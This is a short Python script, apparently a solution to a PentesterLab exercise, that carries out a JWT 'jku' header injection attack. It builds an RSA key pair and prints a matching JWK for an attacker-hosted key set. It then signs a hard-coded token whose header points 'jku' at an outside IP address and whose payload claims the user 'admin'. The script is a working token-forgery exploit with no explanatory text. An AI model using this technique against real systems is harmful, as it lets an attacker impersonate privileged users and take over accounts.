import base64
import hmac
import hashlib
import rsa
import OpenSSL
import jwt

def generate_key(key_size):
    #create rsa priv & public key
    print ("[+]Creating-RSA-pair-key")
    (public_key,private_key) = rsa.newkeys(key_size,poolsize=8)
    print ("\t[+]Pair-key-created")
    return private_key, public_key
privKey, pubKey = generate_key(2048)


def pack_bigint(i):
    b = bytearray()
    while i:
        b.append(i & 0xFF)
        i >>= 8
    return b[::-1]


def generate_JWK(pubkey):
    n=base64.urlsafe_b64encode(pack_bigint(pubkey.n)).decode('utf-8').rstrip('=')
    e=base64.urlsafe_b64encode(pack_bigint(pubkey.e)).decode('utf-8').rstrip('=')
    headerAndPayload = ('{'
                                        '"kty":"RSA",'
                                        '"kid":"penesterlab",'
                                        '"use":"sig",'
                                        '"n":"'+n+'",'
                                        '"e":"'+e+'",'
                                        '"alg":"RS256"'
                                        '}')
    print ("\t[+]Assembed")
    return headerAndPayload



strToSign = "eyJ0eXAiOiAiSldUIiwiYWxnIjogIlJTMjU2Iiwiamt1IjogImh0dHA6Ly8zNS4xNzcuMTAuNTkvLndlbGwta25vd24vandrcy5qc29uIn0K.eyJ1c2VyIjogImFkbWluIn0K".encode()
sig = rsa.pkcs1.sign(strToSign, privKey, 'SHA-256')
print(generate_JWK(pubKey))
print("----")
b64Str = base64.b64encode(sig).decode().rstrip("=")
print(strToSign.decode() +"."+b64Str)
